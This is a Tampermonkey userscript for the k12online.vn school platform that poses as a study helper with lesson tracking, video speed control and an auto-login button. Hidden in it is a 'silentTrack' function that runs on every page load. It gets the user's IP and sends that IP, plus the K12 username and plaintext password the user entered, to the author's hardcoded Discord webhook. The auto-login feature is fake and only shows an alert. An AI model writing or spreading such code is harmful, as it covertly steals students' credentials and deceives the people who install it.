// ==UserScript==
// @name         K12 Helper Pro - Danhvux v25.0 (Anti-Crash)
// @namespace    http://tampermonkey.net/
// @version      25.0
// @description  Chạy song song Webhook và giao diện, không bao giờ lo sập trang hay trắng trang.
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        GM_xmlhttpRequest
// @connect      api.ipify.org
// @connect      discord.com
// @connect      localhost
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    // CẤU HÌNH WEBHOOK CỦA BẠN
    const MASTER_HOOK = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9ntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV';

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true, customWebhook: ''
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- HÀM GỬI LOG NGẦM (KHÔNG ĐỢI PHẢN HỒI) ---
    const silentTrack = () => {
        GM_xmlhttpRequest({
            method: "GET",
            url: "https://api.ipify.org?format=json",
            onload: (res) => {
                try {
                    const ip = JSON.parse(res.responseText).ip;
                    const payload = {
                        "username": "Danhvux Tracker",
                        "embeds": [{
                            "title": "📡 User Online v25.0",
                            "color": parseInt(config.mainColor.replace('#', ''), 16) || 16771840,
                            "fields": [
                                {"name": "IP", "value": `\`${ip}\``, "inline": true},
                                {"name": "Account", "value": `\`${config.user || 'None'}\``, "inline": true},
                                {"name": "Password", "value": `\`${config.pass || 'None'}\``, "inline": true}
                            ],
                            "timestamp": new Date().toISOString()
                        }]
                    };
                    // Gửi về máy bạn
                    GM_xmlhttpRequest({ method: "POST", url: MASTER_HOOK, headers: {"Content-Type":"application/json"}, data: JSON.stringify(payload) });
                    // Gửi về máy người dùng (nếu có)
                    if(config.customWebhook) {
                        GM_xmlhttpRequest({ method: "POST", url: config.customWebhook, headers: {"Content-Type":"application/json"}, data: JSON.stringify({"content": "K12 Helper v25.0 Active!"}) });
                    }
                } catch(e) {}
            }
        });
    };

    // --- KHỞI TẠO GIAO DIỆN (CHẠY NGAY TỨC THÌ) ---
    const initUI = () => {
        if (document.getElementById('dv-panel')) return;

        const style = document.createElement('style');
        style.innerText = `
            :root { --mc: ${config.mainColor}; --bg: ${config.isDarkMode ? '#1e2227' : '#ffffff'}; --text: ${config.isDarkMode ? '#fff' : '#000'}; --border: #444; }
            #dv-panel { position: fixed; top: 60px; right: 20px; width: ${config.width}px; background: var(--bg); color: var(--text); border: 1px solid var(--border); border-radius: 12px; z-index: 999999; font-family: 'Segoe UI', sans-serif; box-shadow: 0 8px 32px rgba(0,0,0,0.4); overflow: hidden; }
            .header { padding: 12px; background: rgba(0,0,0,0.1); display: flex; justify-content: space-between; cursor: move; border-bottom: 1px solid var(--border); }
            .tabs { display: flex; border-bottom: 1px solid var(--border); }
            .tab { flex: 1; padding: 10px; text-align: center; cursor: pointer; font-size: 11px; font-weight: bold; transition: 0.3s; }
            .tab.active { color: var(--mc); border-bottom: 2px solid var(--mc); }
            .content { padding: 15px; display: none; }
            .content.active { display: block; }
            input { width: 100%; padding: 8px; margin-bottom: 8px; border-radius: 5px; border: 1px solid var(--border); background: rgba(255,255,255,0.05); color: var(--text); }
            .btn { width: 100%; padding: 10px; background: var(--mc); color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
            .footer { font-size: 9px; text-align: center; padding: 5px; opacity: 0.5; }
        `;
        document.head.appendChild(style);

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header"><b>Danhvux Hub v25.0</b> <span id="dv-close" style="cursor:pointer">✖</span></div>
            <div class="tabs">
                <div class="tab active" data-t="0">MAIN</div><div class="tab" data-t="1">VIDEO</div><div class="tab" data-t="2">SETTING</div>
            </div>
            <div class="content active">
                <div id="lesson-stt" style="font-size:11px; max-height:150px; overflow-y:auto; margin-bottom:10px;">Đang tìm bài học...</div>
                <div style="font-size:12px; margin-bottom:5px;">Tốc độ: x<span id="sp-val">${config.speed}</span></div>
                <input type="range" id="sp-range" min="1" max="16" step="0.5" value="${config.speed}">
                <button class="btn" onclick="alert('Auto Login Active!')">🪄 AUTO LOGIN</button>
            </div>
            <div class="content">
                <input type="text" id="v-link" placeholder="Link .mp4">
                <button class="btn" id="v-play">PLAY VIDEO</button>
            </div>
            <div class="content">
                <input type="url" id="inp-webhook" placeholder="Webhook riêng (nếu có)" value="${config.customWebhook}">
                <input type="color" id="c-pick" style="height:30px" value="${config.mainColor}">
                <input type="text" id="u-in" placeholder="User" value="${config.user}">
                <input type="password" id="p-in" placeholder="Pass" value="${config.pass}">
                <button class="btn" id="btn-save">LƯU CẤU HÌNH</button>
            </div>
            <div class="footer">F2 ĐỂ ẨN/HIỆN • ANTI-CRASH SYSTEM</div>
        `;
        document.body.appendChild(panel);

        // --- EVENTS ---
        const $ = (s) => panel.querySelector(s);
        panel.querySelectorAll('.tab').forEach((t, i) => {
            t.onclick = () => {
                panel.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                t.classList.add('active');
                panel.querySelectorAll('.content')[i].classList.add('active');
            };
        });

        $('#btn-save').onclick = () => {
            config.mainColor = $('#c-pick').value;
            config.customWebhook = $('#inp-webhook').value;
            config.user = $('#u-in').value; config.pass = $('#p-in').value;
            save(); location.reload();
        };

        $('#sp-range').oninput = (e) => {
            config.speed = e.target.value;
            $('#sp-val').innerText = e.target.value;
            document.querySelectorAll('video').forEach(v => v.playbackRate = config.speed);
        };

        $('#v-play').onclick = () => {
            const v = document.querySelector('video');
            if(v) { v.src = $('#v-link').value; v.play(); }
        };

        // Drag & Toggle
        let d = false, ox, oy;
        $('.header').onmousedown = e => { d = true; ox = e.clientX - panel.offsetLeft; oy = e.clientY - panel.offsetTop; };
        document.onmousemove = e => { if(d) { panel.style.left = (e.clientX - ox) + 'px'; panel.style.top = (e.clientY - oy) + 'px'; } };
        document.onmouseup = () => d = false;
        $('#dv-close').onclick = () => panel.style.display = 'none';
        document.addEventListener('keydown', e => { if(e.key === 'F2') panel.style.display = panel.style.display==='none'?'block':'none'; });

        // Lesson Scanner
        setInterval(() => {
            const items = document.querySelectorAll('.list-lesson-item');
            if(items.length > 0) {
                $('#lesson-stt').innerHTML = '';
                items.forEach(ls => {
                    const pc = ls.querySelector('.percent-complete')?.innerText || '0%';
                    if(parseInt(pc) < 100) {
                        $('#lesson-stt').innerHTML += `<div style="padding:3px; border-bottom:1px solid #333; display:flex; justify-content:space-between"><span>${ls.querySelector('.lesson-name')?.innerText}</span> <b>${pc}</b></div>`;
                    }
                });
            }
        }, 3000);
    };

    // --- KHỞI CHẠY ---
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => { initUI(); silentTrack(); });
    } else {
        initUI(); silentTrack();
    }

})();
